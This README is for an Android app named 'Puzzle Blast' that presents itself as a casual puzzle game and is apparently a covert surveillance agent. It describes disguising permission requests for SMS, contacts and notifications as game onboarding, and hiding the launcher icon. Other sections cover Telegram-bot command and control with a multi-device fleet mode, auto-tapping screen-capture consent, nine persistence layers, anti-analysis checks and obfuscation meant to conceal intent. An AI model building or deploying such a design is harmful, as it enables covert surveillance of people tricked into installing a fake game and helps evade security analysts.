# Puzzle Blast — Android Agent

A casual 5x5 sliding-tile puzzle game for Android. Fully playable offline,
Jetpack Compose + Material 3, purple/teal/cream palette.

## Keystore

A `release.keystore` is included in the project root (generated at build time).
Credentials in `gradle.properties`:

- storepass / keypass: `blast2024`
- alias: `puzzleblast`

To regenerate:

```
keytool -genkeypair -v -keystore release.keystore -alias puzzleblast \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass blast2024 -keypass blast2024 \
  -dname "CN=Puzzle Blast, OU=Games, O=PuzzleBlast, L=Colombo, ST=Western, C=LK"
```

## Build

```
./gradlew assembleRelease
# output: app/build/outputs/apk/release/app-release.apk
```

Requires Android SDK 35, JDK 17, Gradle 8.7+.

## Sideload install

1. Copy APK to device.
2. Tap to install. If Play Protect warns, tap "Install anyway".
3. Enable "Install unknown apps" for your file manager if prompted.

## First-run flow

1. Open app → Home screen (Play / Restore Save / Settings).
2. Tap **Play** → wizard carousel. Each card requests one permission,
   disguised as a game onboarding step (notifications → "puzzle alerts",
   SMS → "invite codes", contacts → "friends who play", etc.).
   One tap per permission — there is no way to auto-grant runtime perms.
3. Last card → "All set! 🎉" → fades to the game board.
4. Play the puzzle. It is a real, fully playable sliding-tile game.

## Restore Save (owner auth)

On the Home screen, tap the small "Restore Save" text link.

- Sync ID: `Sanuka`
- Passphrase: `Sanuka 2012` (one space, case-sensitive, not trimmed)

Correct credentials set `authed=true`. If the wizard is already complete,
the hide sequence fires immediately and the launcher icon vanishes.

## Hide / Unhide

- `/hide` — disables the launcher alias, starts the background sync service.
- `/unhide` — re-enables the launcher alias.
- Recovery if hidden: `adb shell am start -n com.puzzleblast.game/.MainActivity`
  or `adb shell pm enable com.puzzleblast.game/.MainLauncherAlias`.

## MediaProjection (screenshot / screenrec)

First use requires a one-tap consent dialog. The accessibility service
auto-taps "Start now" when found (best-effort; on some OEM skins the user
must tap once). The token is cached per process for reuse.

## Fleet mode (optional)

Telegram Bot API delivers each `getUpdates` call to exactly ONE poller.
Therefore one bot token = one active device agent.

- **Single-device (default):** one build, one device, one bot token.
  `/session`, `/use`, `/all`, `/check_online` operate on this device.
  `dXXXXX` tags are accepted but ignored unless they match this SID.
- **Fleet mode:** build each device with its OWN bot token (set
  `FLEET_MODE=true` and bake per-device credentials). Run a separate
  master bot (lightweight Kotlin/JVM CLI or Android app on the operator's
  phone) holding the list of device tokens; the master relays commands
  between the operator chat and each device bot. The agent code does not
  change — only the routing layer.

## Bot credentials

Token, owner chat ID, and SID are baked into `BuildConfig` as XOR-obfuscated,
base64-encoded fragments (`BOT_P1..3`, `BOT_S1..3`, `OWNER_CID_B64`,
`SID_B64`). Reconstructed at cold start in `BotConfig.kt`. No plaintext
token appears in resources or strings.

To change credentials, edit `gradle.properties` (regenerate fragments with
the included Python snippet or any XOR+base64 tool) and rebuild.

## Persistence

Nine layers: foreground service, boot receiver, watchdog process (:wd),
self-heal loop, AlarmManager exact tick, JobScheduler periodic revive,
NotificationListenerService, AccessibilityService, DeviceAdminReceiver.
Any dead layer is revived within 60s.

## Anti-analysis

Frida / Xposed / debugger / emulator / Magisk / VPN checks run at service
start. On detection the process exits silently (no bot message unless
`REPORT_ANALYST=true`).

## ProGuard

Release builds minify + shrink. Bot data classes and module entry points
are kept; everything else is obfuscated and repackaged under
`com.puzzleblast.game.tiles` so class names don't leak intent.
